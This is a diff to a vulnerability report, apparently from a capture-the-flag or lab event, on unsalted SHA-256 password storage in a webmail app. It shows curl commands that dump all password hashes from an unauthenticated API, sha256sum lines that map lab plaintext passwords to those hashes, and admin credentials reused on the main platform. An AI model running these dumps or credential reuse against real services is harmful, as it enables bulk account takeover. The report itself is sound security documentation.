@@ -7,6 +7,8 @@ The password storage mechanism presents two distinct weaknesses:
 1. **Missing salt** — password hashes are generated without a unique random salt.
 2. **Insufficient computational cost** — SHA-256 is a general-purpose cryptographic hash function and is not designed for secure password storage.
 
+The hash is computed as `hashlib.sha256(password.encode()).hexdigest()` at signup (`tools/Webmail/src/Pages.py`, `API.py` `POST /api/users`), at password change and at login (`Backend.py` `check_connect()`).
+
 These weaknesses reduce the protection of stored credentials in the event of unauthorised disclosure.
 
 # Exploitation
@@ -25,9 +27,11 @@ These weaknesses reduce the protection of stored credentials in the event of una
 curl -s http://webmail.<TARGET>/api/users | python3 -c "import sys,json;[print(u['password_hash']+':'+u['username']) for u in json.load(sys.stdin)['users']]" > hashes.txt
 ```
 
+On a local deployment the webmail listens on port 8088: `curl -s http://localhost:8088/api/users` returns `200 OK` (`Content-Type: application/json`) with `{"count": N, "status": "success", "users": [{"password_hash": "...", "username": "admin@tbox.traced"}, ...]}` and no authentication.
+
 ![Unauthenticated hash dump and collision analysis](Screenshot_2026-05-24_at_12.49.55.png)
 
-**2. Identical hashes prove no salt** — 14 users share one hash, 23 share another:
+**2. Identical hashes prove no salt** — 14 users share one hash, 23 share another (the 23-account cluster was observed on the event instance with player accounts; a freshly seeded instance has the 14-account cluster plus the unique `admin@tbox.traced` hash `74842c85…c47c`):
 
 ```
 26c93e3b…516f  shared by 14 users (john.doe, jane.doe, bob.smith, …)
@@ -36,22 +40,35 @@ curl -s http://webmail.<TARGET>/api/users | python3 -c "import sys,json;[print(u
 
 ![Duplicate-hash clusters confirming missing salt](Screenshot_2026-05-24_at_12.50.04.png)
 
+Reproducible check: two new accounts created with the same password get byte-identical hashes, equal to the plain SHA-256 of the password:
+
+```bash
+for n in 1 2; do
+  curl -s -X POST -H 'Content-Type: application/json' \
+    -d '{"username":"salt_test'$n'","password":"Test123!"}' http://<TARGET>:8088/api/users
+done
+curl -s http://<TARGET>:8088/api/users | python3 -c "import sys,json;[print(u['password_hash'],u['username']) for u in json.load(sys.stdin)['users'] if 'salt_test' in u['username']]"
+# 54de7f606f2523cba8efac173fab42fb7f59d56ceff974c8fdb7342cf2cfe345 salt_test1@tbox.traced
+# 54de7f606f2523cba8efac173fab42fb7f59d56ceff974c8fdb7342cf2cfe345 salt_test2@tbox.traced
+```
+
 **3. Recover plaintext (fast, unsalted):**
 
 ```bash
 echo -n "Tr@c3d!7BxN#m9Kw2YpL" | sha256sum   # → 26c93e3b…516f  (14 accounts)
 echo -n "Test123!"            | sha256sum     # → 54de7f60…e345  (23 accounts)
+echo -n 'X#9kLm$P2v@nQ8w!ZjRe' | sha256sum   # → 74842c85…c47c  (admin@tbox.traced)
 ```
 
 ![Cracked passwords and confirmed login](Screenshot_2026-05-24_at_12.50.30.png)
 
-The cracked webmail passwords are the same passwords used on the main V.R.C platform (lateral compromise).
+The cracked webmail passwords are the same passwords used on the main V.R.C platform (lateral compromise): `johndoe` / `Tr@c3d!7BxN#m9Kw2YpL` and `admin` / `X#9kLm$P2v@nQ8w!ZjRe` both log in at `POST /account/login/` (HTTP 302 to `/account/process/`).
 
 # Risk
 
 | Dimension | Impact |
 |-----------|--------|
-| Confidentiality | 37+ of 59 accounts crackable offline within minutes; reuse exposed. |
+| Confidentiality | 37+ of 59 accounts crackable offline within minutes on the event instance; on a freshly seeded instance all 15 seeded hashes (14 shared + admin) map to known plaintexts. Reuse exposed. |
 | Integrity | Bulk account takeover across webmail and the main platform. |
 | Availability | None directly. |
 
